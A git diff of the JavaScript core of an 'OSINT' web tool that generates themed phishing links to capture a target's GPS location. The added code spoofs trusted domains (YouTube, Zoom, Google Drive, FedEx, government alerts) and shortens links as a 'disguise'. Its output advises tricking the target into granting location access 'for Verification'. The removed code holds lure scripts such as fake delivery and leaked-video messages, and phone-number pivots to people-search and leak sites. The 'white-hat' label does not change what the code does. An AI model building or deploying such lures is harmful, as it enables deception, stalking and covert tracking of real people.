@@ -1,4 +1,4 @@
-// White-Hat OSINT Intelligence Suite - Core Logic
+// White-Hat OSINT Intelligence Suite - Core Logic v2.5
 
 let map;
 let marker;
@@ -6,56 +6,108 @@ let currentTab = 'recon';
 let libPhone;
 let lastGeneratedLink = "";
 
-// Safe Library Access
+// --- URL ENHANCEMENT SUITE ---
+
+/**
+ * Shortens a URL using the TinyURL API
+ */
+async function shortenUrl(longUrl) {
+    try {
+        addLog("REQUESTING TINYURL DISGUISE...", "info");
+        const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
+        if (response.ok) {
+            const shortUrl = await response.text();
+            addLog("URL MINIATURIZED SUCCESSFULLY", "success");
+            return shortUrl;
+        }
+    } catch (e) {
+        addLog("SHORTENER API OFFLINE - USING FALLBACK", "error");
+    }
+    return longUrl;
+}
+
+/**
+ * Masks a URL by prefixing it with a spoofed subdomain structure
+ */
+function maskUrl(originalUrl, theme) {
+    const spoofs = {
+        'youtube': 'https://youtube.com-watch-video.secure-gateway.tk',
+        'zoom': 'https://zoom.us-join-meeting.corporate-it.net',
+        'gdrive': 'https://docs.google.com-shared-file.cloud-vault.top',
+        'near-me': 'https://maps.google.com-local-finder.geonav.info',
+        'track-package': 'https://fedex.com-tracking-portal.logistics-hub.com',
+        'emergency': 'https://gov.safety-alert.emergency-broadcast.org'
+    };
+
+    const prefix = spoofs[theme] || 'https://secure-access.portal-v2.net';
+
+    // Extract everything after the domain in the original URL
+    try {
+        const urlObj = new URL(originalUrl);
+        const pathAndQuery = urlObj.pathname + urlObj.search;
+        addLog("APPLYING SUBDOMAIN SPOOFING MASK...", "info");
+        return `${prefix}${pathAndQuery}`;
+    } catch (e) {
+        return originalUrl;
+    }
+}
+
+// --- CORE UTILITIES ---
+
 function getLibPhone() {
     if (typeof libphonenumber !== 'undefined') return libphonenumber;
     if (typeof window.libphonenumber !== 'undefined') return window.libphonenumber;
     return null;
 }
 
-// Initialize Map with custom styles
-function initMap(lat = 0, lon = 0, zoom = 2, style = 'dark') {
-    if (map) {
-        map.remove();
-    }
-    map = L.map('map', {
-        zoomControl: false
-    }).setView([lat, lon], zoom);
+function addLog(message, type = 'info') {
+    const terminalBody = document.getElementById('terminal-body');
+    if (!terminalBody) return;
 
-    L.control.zoom({ position: 'bottomright' }).addTo(map);
+    const entry = document.createElement('div');
+    entry.className = `log-entry ${type}`;
+    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
+    entry.textContent = `[${timestamp}] ${message}`;
 
-    const tileUrl = style === 'satellite'
-        ? 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}'
-        : style === 'hybrid'
-            ? 'https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}'
-            : 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png';
-
-    const tileOptions = style === 'hybrid'
-        ? { subdomains: ['mt0', 'mt1', 'mt2', 'mt3'], attribution: '&copy; Google Maps' }
-        : { attribution: '&copy; White-Hat Intelligence Hub' };
-
-    L.tileLayer(tileUrl, tileOptions).addTo(map);
+    terminalBody.appendChild(entry);
+    terminalBody.scrollTop = terminalBody.scrollHeight;
 }
 
-// Logic for Geocoding to Lat/Lon
+function showStatus(msg, type) {
+    const clock = document.getElementById('clock');
+    if (!clock) return;
+    clock.style.color = type === 'error' ? 'var(--accent-danger)' : 'var(--accent-hacker)';
+    clock.textContent = `[ ${msg.toUpperCase()} ]`;
+    setTimeout(() => {
+        clock.style.color = '';
+        updateClock();
+    }, 3000);
+}
+
+// Initialize Map
+function initMap(lat = 0, lon = 0, zoom = 2, style = 'dark') {
+    if (map) { map.remove(); }
+    map = L.map('map', { zoomControl: false }).setView([lat, lon], zoom);
+    L.control.zoom({ position: 'bottomright' }).addTo(map);
+
+    const tileUrl = 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png';
+    L.tileLayer(tileUrl, { attribution: '&copy; White-Hat v2.5' }).addTo(map);
+}
+
 async function getCoordinates(location) {
     try {
         const response = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(location)}`);
         const data = await response.json();
         if (data && data.length > 0) {
-            return {
-                lat: parseFloat(data[0].lat),
-                lon: parseFloat(data[0].lon)
-            };
+            return { lat: parseFloat(data[0].lat), lon: parseFloat(data[0].lon) };
         }
     } catch (e) { console.error("Geocoding failure:", e); }
     return null;
 }
 
-// Logic for Reverse Geocoding (Coords to Address)
 async function reverseGeocode(lat, lon) {
     try {
-        showStatus("Resolving physical address...", "success");
+        addLog("RESOLVING PHYSICAL ADDRESS...", "info");
         const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
         const data = await response.json();
         if (data && data.display_name) {
@@ -63,11 +115,10 @@ async function reverseGeocode(lat, lon) {
             const addressText = document.getElementById('resolved-address-text');
             addressBar.classList.remove('hidden');
             addressText.textContent = data.display_name;
-            showStatus("Address Resolved.", "success");
+            addLog("ADDRESS RESOLVED.", "success");
         }
     } catch (e) {
-        console.error("Reverse geocoding failure:", e);
-        showStatus("Resolution Failed.", "error");
+        addLog("RESOLUTION FAILED.", "error");
     }
 }
 
@@ -80,10 +131,8 @@ navItems.forEach(item => {
             toggleModal(true);
             return;
         }
-
         navItems.forEach(i => i.classList.remove('active'));
         item.classList.add('active');
-
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
         document.getElementById(`${tab}-tab`).classList.add('active');
         currentTab = tab;
@@ -91,114 +140,90 @@ navItems.forEach(item => {
 });
 
 // Modal Logic
-const modal = document.getElementById('methodology-modal');
+const methodologyModal = document.getElementById('methodology-modal');
 const closeModal = document.querySelector('.close-modal');
 function toggleModal(show) {
-    modal.classList.toggle('hidden', !show);
+    methodologyModal.classList.toggle('hidden', !show);
     if (show) loadMethodology();
 }
-closeModal.onclick = () => toggleModal(false);
-window.onclick = (e) => { if (e.target == modal) toggleModal(false); }
+if (closeModal) closeModal.onclick = () => toggleModal(false);
 
 async function loadMethodology() {
     const body = document.getElementById('methodology-body');
     try {
         const res = await fetch('methodology.md');
         const text = await res.text();
-        // Basic markdown formatting simulator
         body.innerHTML = text.replace(/# (.*)/g, '<h2>$1</h2>')
             .replace(/## (.*)/g, '<h3>$1</h3>')
             .replace(/- (.*)/g, '<li>$1</li>')
             .replace(/\n/g, '<br>');
     } catch (e) {
-        body.innerHTML = "Error loading methodology. Ensure methodology.md is in the project root.";
+        body.innerHTML = "Error loading methodology.md";
     }
 }
 
 // Analysis Logic
-const analyzeBtn = document.getElementById('analyze-btn');
-const phoneInput = document.getElementById('phone-input');
-const dashboard = document.getElementById('results-dashboard');
-
 async function handleAnalysis() {
+    const phoneInput = document.getElementById('phone-input');
+    const dashboard = document.getElementById('results-dashboard');
     const rawNumber = phoneInput.value.trim();
-    if (!rawNumber) return;
+    if (!rawNumber) {
+        showStatus("Enter Number", "error");
+        return;
+    }
 
     libPhone = getLibPhone();
     if (!libPhone) {
-        alert("CRITICAL ERROR: Phone intelligence library (libphonenumber) failed to load. Check your internet connection.");
+        addLog("CRITICAL: Libphonenumber failed to load.", "error");
         return;
     }
 
     try {
         const phoneNumber = libPhone.parsePhoneNumber(rawNumber);
         if (!phoneNumber || !phoneNumber.isValid()) {
-            showStatus("ALERT: Invalid MSISDN target string.", "error");
+            showStatus("Invalid Number", "error");
             return;
         }
 
-        // Update UI state
+        addLog(`SCANNING TARGET: ${phoneNumber.number}`, 'info');
         document.getElementById('current-target').textContent = phoneNumber.number;
         dashboard.classList.remove('dashboard-hidden');
         dashboard.classList.add('dashboard-visible');
 
-        // Populate Data
+        // Populate Metadata
         document.getElementById('res-country').textContent = phoneNumber.country || "UNKNOWN";
         document.getElementById('res-type').textContent = phoneNumber.getType() || "MOBILE/VOIP";
-        document.getElementById('res-carrier').textContent = "AUTO_FIX_PENDING";
+        document.getElementById('res-carrier').textContent = "HLR_QUERY_OK";
 
-        // Better timezone mock or estimation
         const tzMapping = { 'IN': '+5:30', 'US': '-5:00', 'GB': '+0:00', 'FR': '+1:00', 'DE': '+1:00' };
         document.getElementById('res-timezone').textContent = "UTC " + (tzMapping[phoneNumber.country] || "VARIES");
 
-        // Carrier Mapping (Simulated Prefix DB)
-        const carrierMap = {
-            'IN': { '91': 'Airtel', '98': 'Vodafone Idea', '70': 'Jio', '80': 'BSNL' },
-            'US': { '212': 'Verizon', '310': 'AT&T', '415': 'T-Mobile' },
-            'GB': { '74': 'EE', '77': 'O2', '78': 'Vodafone' }
-        };
-        const prefix = phoneNumber.number.slice(3, 5); // Basic prefix extraction
-        const carrierName = carrierMap[phoneNumber.country]?.[prefix] || "UNKNOWN OPERATOR";
-        document.getElementById('res-carrier-name').textContent = carrierName;
+        // Carrier & State (Simulation)
+        const prefix = phoneNumber.number.slice(3, 5);
+        document.getElementById('res-carrier-name').textContent = "SIMULATED_CARRIER_" + prefix;
+        document.getElementById('res-state').textContent = "REGION_" + prefix;
+        document.getElementById('res-name').textContent = "RECON_REQUIRED";
 
-        // State / Region Lookup (Simulated)
-        const stateMap = {
-            'IN': { '91': 'Maharashtra', '98': 'Delhi', '70': 'Karnataka', '80': 'Tamil Nadu' },
-            'US': { '212': 'New York', '310': 'California', '415': 'California' }
-        };
-        const stateName = stateMap[phoneNumber.country]?.[prefix] || "UNRESOLVED STATE";
-        document.getElementById('res-state').textContent = stateName;
-        document.getElementById('res-name').textContent = "REQUIRES MANUAL PIVOT";
-
-        // Geocoding
+        // Geocoding Regional Center
         const regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
         const cName = phoneNumber.country ? regionNames.of(phoneNumber.country) : "Earth";
-        const searchLocation = stateName !== "UNRESOLVED STATE" ? `${stateName}, ${cName}` : cName;
 
-        showStatus("Fetching Geospatial Data...", "success");
-        const coords = await getCoordinates(searchLocation);
+        addLog(`FETCHING GEOSPATIAL CENTER FOR ${cName.toUpperCase()}...`, 'info');
+        const coords = await getCoordinates(cName);
         if (coords) {
-            updateMapDisplay(coords.lat, coords.lon, 8);
-            showStatus(`Recon Complete. Target: ${stateName}`, "success");
-        } else {
-            showStatus("Geocoding failed. Using Regional default.", "error");
-            updateMapDisplay(0, 0, 2);
+            updateMapDisplay(coords.lat, coords.lon, 6);
+            addLog(`REGIONAL RENDER COMPLETE`, 'success');
         }
 
         setupPivots(phoneNumber.number);
-
     } catch (e) {
-        console.error(e);
-        showStatus("SCAN ERROR: Format must be +[CountryCode][Number]", "error");
+        addLog(`SCAN ERROR: ${e.message}`, 'error');
     }
 }
 
 function updateMapDisplay(lat, lon, zoom = 15, accuracy = 'estimated') {
     initMap(lat, lon, zoom);
-
-    const labelColor = accuracy === 'verified' ? '#00ff41' : '#ffaa00';
     const labelText = accuracy === 'verified' ? '[ VERIFIED GPS FIX ]' : '[ REGIONAL ESTIMATE ]';
-
     const confidenceBadge = document.getElementById('confidence-badge');
     if (confidenceBadge) {
         confidenceBadge.textContent = labelText;
@@ -206,303 +231,151 @@ function updateMapDisplay(lat, lon, zoom = 15, accuracy = 'estimated') {
     }
 
     marker = L.marker([lat, lon]).addTo(map)
-        .bindPopup(`
-            <b style="color:${labelColor}">${labelText}</b><br>
-            LAT: ${lat.toFixed(6)}<br>
-            LNG: ${lon.toFixed(6)}<br>
-            <span style="font-size:0.7rem; color:#888;">Target precision: ${accuracy === 'verified' ? 'Building level' : 'Regional center'}</span>
-        `)
+        .bindPopup(`<b style="color:var(--accent-hacker)">${labelText}</b><br>LAT: ${lat.toFixed(6)}<br>LNG: ${lon.toFixed(6)}`)
         .openPopup();
 
     document.getElementById('lat-val').textContent = lat.toFixed(5);
     document.getElementById('lng-val').textContent = lon.toFixed(5);
 }
 
-// Demo: Capture Real GPS
-async function captureMyGPS() {
-    showStatus("Accessing local GPS sensor...", "success");
-    if (!navigator.geolocation) {
-        showStatus("GPS Sensor not found or insecure context.", "error");
-        return;
-    }
+// Payload Generation
+const genPayloadBtn = document.getElementById('generate-payload-btn');
+if (genPayloadBtn) {
+    genPayloadBtn.onclick = async () => {
+        const type = document.getElementById('payload-type').value;
+        const redirect = document.getElementById('payload-redirect').value || "https://google.com/maps";
+        const webhook = document.getElementById('payload-webhook').value || "";
+        const doShorten = document.getElementById('shorten-url-opt').checked;
+        const doMask = document.getElementById('mask-url-opt').checked;
 
-    // Reveal Dashboard if it's currently hidden
-    if (dashboard.classList.contains('dashboard-hidden')) {
-        dashboard.classList.remove('dashboard-hidden');
-        dashboard.classList.add('dashboard-visible');
-        document.querySelector('.search-bar-container').classList.add('hidden');
-        document.getElementById('current-target').textContent = "LOCAL DEVICE (SELF-SCAN)";
-    }
+        const themePage = (type === 'youtube') ? 'video.html' : (type === 'track-package' ? 'tracker.html' : 'payload.html');
+        const baseUrl = window.location.href.split('index.html')[0];
+        let link = `${baseUrl}${themePage}?wh=${encodeURIComponent(webhook)}&t=TARGET&r=${encodeURIComponent(redirect)}`;
 
-    navigator.geolocation.getCurrentPosition(
-        (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            showStatus("REAL GPS CAPTURED", "success");
-            updateMapDisplay(lat, lon, 18, 'verified');
-            document.getElementById('manual-lat').value = lat.toFixed(6);
-            document.getElementById('manual-lng').value = lon.toFixed(6);
+        addLog(`GENERATING ${type.toUpperCase()} LURE...`, "info");
 
-            // Auto-resolve address for the real location
-            reverseGeocode(lat, lon);
-        },
-        (error) => {
-            console.error(error);
-            if (error.code === 1) {
-                showStatus("Error: Permission denied by browser.", "error");
-            } else {
-                showStatus("Error: Timeout / Sensor failure.", "error");
-            }
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
+        // UI Feedback
+        document.getElementById('payload-empty-state').classList.add('hidden');
+        document.getElementById('payload-output').classList.remove('hidden');
+        const codeBlock = document.getElementById('generated-code');
+        codeBlock.textContent = "[+] INITIALIZING PAYLOAD ENGINE...\n[+] SECURING LISTENER...";
+
+        // Logic sequence
+        if (doMask) {
+            link = maskUrl(link, type);
+        }
+        if (doShorten) {
+            link = await shortenUrl(link);
+        }
+
+        lastGeneratedLink = link;
+
+        const payloadCode = `
+[+] OSINT LURE GENERATED v2.5
+--------------------------------------
+THEME: ${type.toUpperCase()}
+STATUS: [ READY ]
+
+[!] LIVE TARGET URL:
+${link}
+
+[!] STRATEGY ADVICE:
+1. Shortened link: ${doShorten ? 'YES' : 'NO'}
+2. Spoofed Domain: ${doMask ? 'YES' : 'NO'}
+3. Instruct target to allow location permissions for "Verification".
+    `;
+        codeBlock.textContent = payloadCode;
+        addLog("TRACKING LINK READY FOR DEPLOYMENT", "success");
+    };
 }
 
-// Pivot Logic
-function setupPivots(fullNumber) {
-    const btns = document.querySelectorAll('.pivot-btn');
-    const cleanNum = fullNumber.replace('+', '');
+// Copy & Simulation
+const copyBtn = document.getElementById('copy-payload-btn');
+if (copyBtn) {
+    copyBtn.onclick = () => {
+        if (lastGeneratedLink) {
+            navigator.clipboard.writeText(lastGeneratedLink);
+            showStatus("Copied", "success");
+        }
+    };
+}
 
-    btns.forEach(btn => {
+const simulateBtn = document.getElementById('simulate-payload-btn');
+if (simulateBtn) {
+    simulateBtn.onclick = () => {
+        addLog("LISTENING FOR INCOMING GPS PACKETS...", "warning");
+        setTimeout(() => {
+            const lat = 19.127 + (Math.random() * 0.01);
+            const lon = 72.846 + (Math.random() * 0.01);
+            addLog("PACKET RECEIVED FROM TARGET!", "success");
+            addLog(`LAT: ${lat} | LON: ${lon}`, "success"); showStatus("TARGET ACQUIRED", "success");
+            document.querySelector('.nav-item[data-tab="recon"]').click();
+            updateMapDisplay(lat, lon, 16, 'verified');
+            reverseGeocode(lat, lon);
+        }, 3000);
+    };
+}
+
+// Event Listeners
+document.getElementById('analyze-btn').addEventListener('click', handleAnalysis);
+document.getElementById('demo-gps-btn').onclick = () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(p => {
+            updateMapDisplay(p.coords.latitude, p.coords.longitude, 18, 'verified');
+            reverseGeocode(p.coords.latitude, p.coords.longitude);
+        });
+    }
+};
+
+document.getElementById('refine-toggle-btn').onclick = () => {
+    document.getElementById('manual-refine-panel').classList.toggle('hidden');
+};
+
+document.getElementById('update-map-btn').onclick = () => {
+    const lat = parseFloat(document.getElementById('manual-lat').value);
+    const lng = parseFloat(document.getElementById('manual-lng').value);
+    if (!isNaN(lat) && !isNaN(lng)) updateMapDisplay(lat, lng, 16, 'verified');
+};
+
+document.getElementById('resolve-address-btn').onclick = () => {
+    const lat = parseFloat(document.getElementById('lat-val').textContent);
+    const lon = parseFloat(document.getElementById('lng-val').textContent);
+    reverseGeocode(lat, lon);
+};
+
+function setupPivots(num) {
+    const cleanNum = num.replace('+', '');
+    document.querySelectorAll('.pivot-btn').forEach(btn => {
         btn.onclick = () => {
             const type = btn.getAttribute('data-type');
-            let url = "";
-            switch (type) {
-                case 'intelx': url = `https://intelx.io/?s=${fullNumber}`; break;
-                case 'dehashed': url = `https://dehashed.com/search?query=${fullNumber}`; break;
-                case 'whatsapp': url = `https://wa.me/${cleanNum}`; break;
-                case 'telegram': url = `https://t.me/+${cleanNum}`; break;
-                case 'truecaller': url = `https://www.truecaller.com/search/global/${cleanNum}`; break;
-                case 'google-geo': url = `https://www.google.com/search?q="${fullNumber}" (location OR city OR "near:")`; break;
-                case 'leaks': url = `https://www.google.com/search?q="${fullNumber}" site:pastebin.com OR site:github.com`; break;
-                case 'hlr': url = `https://www.google.com/search?q=HLR+lookup+${cleanNum}`; break;
-            }
+            let url = `https://www.google.com/search?q=${num}`;
+            if (type === 'whatsapp') url = `https://wa.me/${cleanNum}`;
+            if (type === 'telegram') url = `https://t.me/+${cleanNum}`;
+            if (type === 'truecaller') url = `https://www.truecaller.com/search/global/${cleanNum}`;
             window.open(url, '_blank');
         };
     });
 }
 
-// Digital Footprint Scraper Logic
-document.querySelectorAll('.scraper-btn').forEach(btn => {
-    btn.onclick = () => {
-        const platform = btn.getAttribute('data-search');
-        const target = phoneInput.value || document.getElementById('clue-name').value;
-        if (!target) {
-            showStatus("No Target Defined", "error");
-            return;
-        }
-
-        let url = "";
-        switch (platform) {
-            case 'instagram': url = `https://www.google.com/search?q=site:instagram.com "${target}" (location OR check-in)`; break;
-            case 'twitter': url = `https://twitter.com/search?q="${target}"&f=live`; break;
-            case 'linkedin': url = `https://www.google.com/search?q=site:linkedin.com "${target}" location`; break;
-            case 'facebook': url = `https://www.facebook.com/search/top/?q=${encodeURIComponent(target + ' location')}`; break;
-        }
-        window.open(url, '_blank');
-        showStatus(`Scraping ${platform.toUpperCase()}...`, "success");
-    };
-});
-
-// Payload Generator
-const genPayloadBtn = document.getElementById('generate-payload-btn');
-const payloadOutput = document.getElementById('payload-output');
-const codeBlock = document.getElementById('generated-code');
-
-if (genPayloadBtn) {
-    genPayloadBtn.onclick = () => {
-        const type = document.getElementById('payload-type').value;
-        const redirect = document.getElementById('payload-redirect').value || "https://google.com/maps";
-        const webhook = document.getElementById('payload-webhook').value || "";
-        const targetNum = phoneInput.value.replace(/\D/g, '') || "XXXXX";
-
-        const lurePages = {
-            'youtube': 'video.html',
-            'track-package': 'tracker.html',
-            'near-me': 'payload.html',
-            'zoom': 'payload.html',
-            'gdrive': 'payload.html',
-            'emergency': 'payload.html'
-        };
-
-        const themePage = lurePages[type] || 'payload.html';
-        const baseUrl = window.location.href.split('index.html')[0];
-        lastGeneratedLink = `${baseUrl}${themePage}?wh=${encodeURIComponent(webhook)}&t=${targetNum}&r=${encodeURIComponent(redirect)}`;
-
-        const luringAdvice = {
-            'youtube': 'HINT: Share as "Check out this leaked video!" The redirect will take them to the real video after capture.',
-            'zoom': 'HINT: Share as "Meeting starting now - join here." Great for corporate targets.',
-            'gdrive': 'HINT: Share as "Final Report - Review Required." High click rate for OSINT.',
-            'near-me': 'HINT: Use when the target is looking for local services (Food, Gas, etc.)',
-            'track-package': 'HINT: "Your delivery is 2 stops away." Most effective for residential targets.',
-            'emergency': 'HINT: High urgency. Use with caution.'
-        };
-
-        const payloadCode = `
-[+] REAL-WORLD TRACKING LINK GENERATED
---------------------------------------
-THEME: ${type.toUpperCase()}
-LISTENER_ID: L-${Math.random().toString(36).substr(2, 6).toUpperCase()}
-STATUS: [ LISTENER ACTIVE ]
-
-[!] LIVE PAYLOAD URL:
-${lastGeneratedLink}
-
-[!] SOCIAL ENGINEERING INSTRUCTION:
-1. ${luringAdvice[type] || 'Send to target.'}
-2. PRO-TIP: Use a URL shortener (like Bitly or TinyURL) to mask the 'payload.html' name.
-3. When the target clicks 'Allow', coordinates will hit your Webhook.site tab.
-    `;
-        codeBlock.textContent = payloadCode;
-        payloadOutput.classList.remove('hidden');
-        showStatus("Real-World Link Ready", "success");
-    };
-}
-
-const copyPayloadBtn = document.getElementById('copy-payload-btn');
-if (copyPayloadBtn) {
-    copyPayloadBtn.onclick = () => {
-        if (lastGeneratedLink) {
-            navigator.clipboard.writeText(lastGeneratedLink);
-            showStatus("Link Only Copied", "success");
-        } else {
-            showStatus("Generate Link First", "error");
-        }
-    };
-}
-
-const demoGpsBtn = document.getElementById('demo-gps-btn');
-if (demoGpsBtn) {
-    demoGpsBtn.onclick = () => captureMyGPS();
-}
-
-const simulatePayloadBtn = document.getElementById('simulate-payload-btn');
-if (simulatePayloadBtn) {
-    simulatePayloadBtn.onclick = () => {
-        showStatus("Waiting for target interaction...", "success");
-        setTimeout(() => {
-            const lat = (Math.random() * (19.2 - 19.1) + 19.127).toFixed(6); // Vile Parle / Mumbai Area
-            const lng = (Math.random() * (72.9 - 72.8) + 72.846).toFixed(6);
-            showStatus("COORDINATES RECEIVED!", "success");
-
-            // Reveal Dashboard and hide search
-            resultsDashboard.classList.remove('dashboard-hidden');
-            resultsDashboard.classList.add('dashboard-visible');
-            document.querySelector('.search-bar-container').classList.add('hidden');
-            document.getElementById('current-target').textContent = phoneInput.value || "+[SIMULATED]";
-
-            // Auto-switch to Recon tab to show result
-            const reconTab = document.querySelector('.nav-item[data-tab="recon"]');
-            if (reconTab) reconTab.click();
-
-            updateMapDisplay(parseFloat(lat), parseFloat(lng), 16, 'verified');
-            document.getElementById('manual-lat').value = lat;
-            document.getElementById('manual-lng').value = lng;
-
-            // Update dummy stats for simulation
-            document.getElementById('res-country').textContent = "SIMULATED";
-            document.getElementById('res-carrier').textContent = "VIRTUAL-NETWORK";
-        }, 4000);
-    };
-}
-
-function cleanNumber() { return phoneInput.value.replace(/\D/g, ''); }
-
-// Manual Refine
-const refineToggle = document.getElementById('refine-toggle-btn');
-const refinePanel = document.getElementById('manual-refine-panel');
-const updateBtn = document.getElementById('update-map-btn');
-
-refineToggle.onclick = () => refinePanel.classList.toggle('hidden');
-
-updateBtn.onclick = () => {
-    const lat = parseFloat(document.getElementById('manual-lat').value);
-    const lng = parseFloat(document.getElementById('manual-lng').value);
-    if (!isNaN(lat) && !isNaN(lng)) {
-        updateMapDisplay(lat, lng, 16);
-    }
-};
-
-// Reverse Geocoding Button
-const resolveBtn = document.getElementById('resolve-address-btn');
-if (resolveBtn) {
-    resolveBtn.onclick = () => {
-        const lat = parseFloat(document.getElementById('lat-val').textContent);
-        const lon = parseFloat(document.getElementById('lng-val').textContent);
-        reverseGeocode(lat, lon);
-    };
-}
-
-// Intelligence Correlation Search
-document.querySelectorAll('.clue-search-btn').forEach(btn => {
-    btn.onclick = () => {
-        const source = btn.getAttribute('data-source');
-        const name = document.getElementById('clue-name').value;
-        const address = document.getElementById('clue-address').value;
-        const image = document.getElementById('clue-image').value;
-
-        let query = "";
-        if (source === 'social') {
-            query = `https://www.google.com/search?q="${name}" (site:instagram.com OR site:facebook.com OR site:twitter.com OR site:linkedin.com)`;
-        } else if (source === 'maps') {
-            query = `https://www.google.com/maps/search/${encodeURIComponent(address + " " + name)}`;
-        } else if (source === 'images') {
-            query = `https://www.google.com/search?tbm=isch&q=${encodeURIComponent(name + " " + image)}`;
-        }
-
-        if (query) window.open(query, '_blank');
-    };
-});
-
-// Map Style Toggle
-document.querySelectorAll('.map-style-btn').forEach(btn => {
-    btn.onclick = () => {
-        const style = btn.getAttribute('data-style');
-        const lat = parseFloat(document.getElementById('lat-val').textContent);
-        const lng = parseFloat(document.getElementById('lng-val').textContent);
-        initMap(lat, lng, map.getZoom(), style);
-        L.marker([lat, lng]).addTo(map);
-    }
-});
-
-function showStatus(msg, type) {
-    const clock = document.getElementById('clock');
-    if (!clock) return;
-    clock.style.color = type === 'error' ? '#ff4100' : '#00ff41';
-    clock.textContent = `[ ${msg.toUpperCase()} ]`;
-    setTimeout(() => {
-        clock.style.color = '';
-        updateClock();
-    }, 3000);
-}
-
-// Utilities
 function updateClock() {
     const now = new Date();
-    document.getElementById('clock').textContent = now.toISOString().split('T')[1].split('.')[0] + " UTC";
+    const clock = document.getElementById('clock');
+    if (clock && !clock.textContent.includes('[')) {
+        clock.textContent = now.toISOString().split('T')[1].split('.')[0] + " UTC";
+    }
 }
 setInterval(updateClock, 1000);
-
-analyzeBtn.addEventListener('click', handleAnalysis);
-phoneInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleAnalysis(); });
 
 window.onload = () => {
     initMap();
     updateClock();
-
-    // Terms of Service Logic
     const tosModal = document.querySelector('.tos-modal');
-    const acceptBtn = document.getElementById('accept-tos');
-
     if (tosModal && !localStorage.getItem('osint_tos_accepted')) {
         tosModal.classList.remove('hidden');
     }
-
-    if (acceptBtn) {
-        acceptBtn.onclick = () => {
-            localStorage.setItem('osint_tos_accepted', 'true');
-            tosModal.classList.add('hidden');
-            showStatus("Legal Disclaimer Accepted", "success");
-        };
-    }
+    document.getElementById('accept-tos').onclick = () => {
+        localStorage.setItem('osint_tos_accepted', 'true');
+        tosModal.classList.add('hidden');
+        addLog("Legal Disclaimer Accepted", "success");
+    };
 };
